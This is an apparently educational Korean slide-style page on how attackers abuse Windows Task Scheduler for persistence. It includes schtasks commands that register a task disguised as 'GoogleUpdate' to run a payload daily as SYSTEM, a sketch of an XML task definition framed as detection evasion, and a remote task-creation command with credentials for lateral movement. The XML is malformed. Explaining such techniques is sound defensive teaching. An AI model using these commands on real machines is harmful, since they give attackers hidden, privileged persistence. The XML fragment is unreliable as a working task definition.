#1. Windows 작업 스케줄러 개념

⏰ ➜ 🚪 ➜ 🌙 ➜ 💥

"매일 새벽 3시에 자동으로 문을 열어두는 타이머"

집에 타이머를 설치해서 매일 새벽 3시에 현관문이 자동으로 열리도록 설정한다면? 도둑은 그 시간에만 와서 유유히 드나들 수 있습니다. Windows 작업 스케줄러(Task Scheduler)는 특정 시간이나 조건에 프로그램을 자동 실행하는 기능입니다. 공격자는 이를 악용하여 정기적으로 악성 코드를 실행합니다.

#2. schtasks 공격 기법

schtasks /create 명령어

# 매일 새벽 3시에 악성코드 실행
schtasks /create /tn "GoogleUpdate"
  /tr "C:\Users\Public\payload.exe"
  /sc daily /st 03:00
  /ru SYSTEM /f

# /tn: 작업 이름 (정상처럼 위장)
# /tr: 실행할 프로그램
# /sc: 스케줄 유형 (daily)
# /ru: 실행 계정 (SYSTEM = 최고 권한)

XML 작업 정의

복잡한 트리거와 조건을 XML 파일로 정의하여 schtasks /create /xml로 등록합니다. 탐지 우회를 위해 사용됩니다.

<Task>
 <Triggers>
  <TimeTrigger>
   <StartBoundary>03:00</>
  </TimeTrigger>
 </Triggers>
 <Actions>
  <Exec>payload.exe</Exec>
 </Actions>
</Task>

원격 예약 작업

schtasks /create /s 옵션으로 원격 PC에 작업을 등록합니다. 측면 이동과 지속성을 동시에 확보합니다.

# 원격 PC에 작업 등록
schtasks /create
 /s 192.168.1.100
 /u admin /p password
 /tn "Updater"
 /tr "cmd /c net user..."
 /sc onlogon
